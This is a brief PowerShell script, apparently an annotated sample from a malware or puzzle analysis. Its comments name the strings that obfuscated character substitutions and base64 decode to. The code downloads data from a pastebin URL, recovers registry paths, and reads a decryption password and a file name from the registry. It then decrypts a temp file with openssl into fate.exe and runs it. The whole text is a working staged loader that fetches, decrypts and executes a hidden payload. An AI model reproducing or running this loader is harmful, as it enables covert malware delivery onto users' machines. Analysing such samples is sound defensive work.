# Decodes the string "HKLM:\SOFTWARE\Microsoft\Windows\TabletPC\Bell"
$SCOP = ((new-object System.Net.WebClient).DownloadString("https://pastebin.com/raw/rBXHdE85")).Replace("!","f").Replace("@","q").Replace("#","z").Replace("<","B").Replace("%","K").Replace("^","O").Replace("&","T").Replace("*","Y").Replace("[","4").Replace("]","9").Replace("{","=");
$SLPH = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64 String($SCOP));

# Reads the string "M4RK_MY_W0Rd5" from the registry key "Blast"
$E = (Get-ItemProperty -Path $SLPH -Name Blast)."Blast";

# Decodes the string "HKLM:\SOFTWARE\Microsoft\Wbem\Tower"
$TWR = "!M[[pcU09%d^kV&l#9*0XFd]cVG93<".Replace("!","SEt").Replace("@","q").Replace("#","jcm").Replace("<","ZXI=").Replace("%","GVF").Replace("^","BU").Replace("&","cTW").Replace("*","zb2Z").Replace("[","T").Replace("]","iZW1").Replace("{","Fdi");
$BRN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TWR));
$D = (Get-ItemProperty -Path $BRN -Name Off)."Off";

# \EOTW\151.txt
openssl aes-256-cbc -a -A -d -salt -md sha256 -in $env:temp$D -pass pass:$E -out "c:\1\fate.exe";
C:\1\fate.exe;
